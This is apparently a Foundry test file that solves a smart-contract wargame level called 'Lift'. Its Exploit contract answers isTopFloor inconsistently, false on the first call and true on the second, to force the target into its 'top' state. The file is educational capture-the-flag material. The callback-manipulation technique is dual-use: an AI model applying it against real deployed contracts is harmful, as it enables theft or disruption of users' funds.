// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/07_Lift/Lift.sol";

// forge test --match-contract LiftTest
contract LiftTest is BaseTest {
    Lift instance;
    bool isTop = true;

    function setUp() public override {
        super.setUp();

        instance = new Lift();
    }

    function testExploitLevel() public {
        Exploit exploit = new Exploit();

        vm.prank(address(exploit));

        instance.goToFloor(0);

        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(instance.top(), "Solution is not solving the level");
    }
}

contract Exploit is House {
    bool public firstCall = true;

    function isTopFloor(uint256) external override returns (bool) {
        if (firstCall) {
            firstCall = false;
            return false;
        }
        return true;
    }
}
